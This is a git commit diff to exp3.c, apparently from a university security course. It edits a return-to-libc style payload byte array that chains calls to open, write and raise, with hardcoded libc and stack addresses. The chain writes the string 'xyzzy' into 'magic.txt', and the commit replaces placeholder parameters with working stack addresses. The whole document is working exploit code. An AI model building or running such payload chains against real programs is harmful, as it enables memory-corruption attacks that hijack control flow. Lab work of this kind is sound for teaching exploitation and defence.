1bb4f62b2c32e1f4d4d73bbd9e38fdd78fed5965
malique-bodie <malique_bodie@brown.edu>
2021-10-28 06:19:18 -0400

    close

--- exp3.c
+++ exp3.c
@@ -25,18 +25,18 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	"\xf0\xea\xec\xb3" 					//<open> 0xb3eceaf0
 	"\x5d\x89\xe1\xb3"  				//<return> 0001e86d +  0xb3dfa0f0 = 0xB3E1895D
-	"\x2c\xc3\xff\xbf" 					//<first param> *fix
+	"\x4c\xc3\xff\xbf" 					//<first param> *fix 0xBF FF C3 4C
 	"\x01\x00\x00\x00"					//<second param>
 	"\x00\x00\x00\x00"					//<third param>
 	"\x10\xf0\xec\xb3" 					//<write> 0xb3ecf010
 	"\x5d\x89\xe1\xb3"					//<return>  0001e86d +  0xb3dfa0f0 = 0xB3E1895D
 	"\x03\x00\x00\x00"					//<first param> 
-	"\x90\x90\x90\x90"					//<second param> *fix
+	"\x56\xc3\xff\xbf"					//<second param> 0xBFFFC356
 	"\x06\x00\x00\x00"					//<third param>
 	"\x40\x1d\xe1\xb3"					//<raise> 0xb3e11d40
 	"\x0c\x00\x00\x00"					//<first param>
-	"magic.txt\0"
-	"xyzzy\0";						
+	"magic.txt\x00" //0xBFFFC34C
+	"xyzzy\x00"; //0xBFFFC356						
 
 
 	/* ------------------------------------	*/
